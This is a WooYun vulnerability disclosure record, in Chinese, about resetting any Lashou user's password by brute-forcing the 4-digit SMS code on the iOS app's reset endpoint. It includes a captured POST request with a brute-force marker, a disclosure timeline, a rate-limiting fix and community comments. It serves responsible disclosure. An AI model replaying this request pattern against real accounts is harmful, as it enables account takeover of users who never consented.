{"id": 6109, "wybug_id": "wooyun-2013-047169", "wybug_title": "换个姿势第三次重置拉手网任意用户密码", "wybug_corp": "拉手网", "wybug_author": "niliu", "wybug_date": "2013-12-27 17:14", "wybug_open_date": "2014-02-10 17:15", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-10：\t细节向公众公开  简要描述： 另一种姿势，同样可以简单重置拉手网用户密码！ 详细说明：  第一次重置密码是利用爆破手机验证码方式重置用户密码： WooYun: 拉手网设计不当可修改部分用户密码 第二次是利用某处信息泄露组合技能重置用户密码： WooYun: 猥琐方式再次重置拉手网用户密码 这一次是受@带馅儿馒头 的这个漏洞  WooYun: 拉手网某处设计缺陷导致可重置任意用户密码  的启发通过APP重置密码抓包来重置密码。ios端找回密码只支持手机号码找回密码，上次带馅儿馒头提到的通过抓包，发包在返回的代码注释里直接显示了手机验证码。经过测试已经修复。但是换个方式依然还是可以重置密码。首先先在手机端找回密码，\n\n系统会发送一个4位数字验证码，用来重置密码。这里我随便写个1111来提交。提交前设置好代理，PC端抓包\n\n抓包数据：\nPOST /lashou.php/Pass/upPwd/STID/groupbuy_5.70_iphone_10000_6CC26BF381DC_4003212_2419_iPhone3,1_5.1.1_(null)_fbc20bed0cf5eb6531***02be5c393541c2ed178 HTTP/1.1Host: api.mobile.lashou.comUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B206Content-Length: 472Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://api.mobile.lashou.comContent-Type: application/x-www-form-urlencodedReferer: http://api.mobile.lashou.com/lashou.php/Pass/sendPwdCode/STID/groupbuy_5.70_iphone_10000_6CC26BF381DC_4003212_2419_iPhone3,1_5.1.1_(null)_fbc20bed0cf5eb6531b4*****93541c2ed178Accept-Language: zh-cnAccept-Encoding: gzip, deflateCookie: ThinkID=66ffc98d52bd20e3e463fPragma: no-cacheConnection: keep-aliveProxy-Connection: keep-alivecode=§1111§&password=a123456789&pass_again=a123456789&tip=%E5%8F%91%E9%80%81%E6%88%90%E5%8A%9F%EF%BC%8C%E8%AF%B7%E6%B3%A8%E6%84%8F%E6%9F%A5%E6%94%B6&mobile=18********4&email=&sign=d856983ac5ff53492***d0adb9a7f77c&nostid=&stid=groupbuy_5.70_iphone_10000_6CC26BF381DC_4003212_2419_iPhone3%2C1_5.1.1_%28null%29_fbc20bed0cf5eb653****2be5c393541c2ed178&params=%7B%22time%22%3A1388126455%7D&time=1388126455&__hash__=fc73c443fb7bc484b6**3fc2b892_d4f9017b4a8054242959c72b15b8b\n4位数字验证码爆破速度是非常快的。很简单就可以重置密码。\n\n跑完4位数字验证码，密码也重置成功了。登录即可。\n\n   漏洞证明：  上面。   修复方案：  #同一个地方问题修复要彻底。#对APP端验证码提交做个限制。#没有礼物就求高rank~  ：）   版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2013-12-27 20:30 厂商回复： 感谢，已经告知开发！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-27 17:25 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  又是爆破验证码？    \n     2013-12-27 17:35 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @霍大然 你猜~~    \n     2013-12-27 18:22 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  换个姿势再来一次    \n     2013-12-27 19:21 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @niliu @zzR  姿势各种姿势    \n     2013-12-27 19:21 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @zzR 恩，这个可以有。    \n     2013-12-27 19:27 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @寂寞的瘦子 姿势不对，努力白费    \n     2014-02-10 12:30 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  @niliu @xsser 这个问题我当初提过，不知道是谁审核的直接pass掉了 http://www.wooyun.org/bugs/wooyun-2013-043792/trace/ec67656e597f90572c41baf4df953791    \n     2014-02-10 12:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @带馅儿馒头 审核的失误 以后可以直接@我 或者@Finger    \n     2014-02-10 13:20 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @带馅儿馒头 还真是哎，真是失误。    \n     2014-02-10 22:17 |    \t\tlosthacker \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        | 我是好人                    (PS:为什么...)\t\t \n  @niliu 能告诉我您用的是什么安卓模拟器吗，我想学习下    \n     2014-02-11 13:15 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @losthacker 不是啊，看看zzR的文章吧~http://drops.wooyun.org/tips/749    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}